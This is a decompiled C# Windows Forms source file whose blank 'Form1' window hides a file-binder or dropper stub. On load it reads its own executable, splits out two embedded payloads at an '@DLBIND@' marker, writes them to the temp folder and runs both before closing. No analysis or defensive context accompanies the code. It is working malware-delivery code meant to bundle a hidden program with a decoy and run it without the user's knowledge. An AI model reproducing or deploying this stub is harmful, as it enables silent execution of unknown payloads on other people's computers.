using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

[DesignerGenerated]
internal class Form1 : Form
{
	private IContainer icontainer_0;

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(292, 268);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string tempPath = Path.GetTempPath();
		FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)(-1), -1);
		string text = Strings.Space(checked((int)FileSystem.LOF(1)));
		FileSystem.FileGet(1, ref text, -1L, false);
		FileSystem.FileClose(new int[1] { 1 });
		string[] array = Strings.Split(text, "@DLBIND@", -1, (CompareMethod)0);
		FileSystem.FileOpen(3, tempPath + "\\" + array[3], (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
		FileSystem.FilePut(3, array[1], -1L, false);
		FileSystem.FileClose(new int[1] { 3 });
		FileSystem.FileOpen(3, tempPath + "\\" + array[4], (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
		FileSystem.FilePut(3, array[2], -1L, false);
		FileSystem.FileClose(new int[1] { 3 });
		Process.Start(tempPath + array[3]);
		Process.Start(tempPath + array[4]);
		((Form)this).Close();
		ProjectData.EndApp();
	}
}
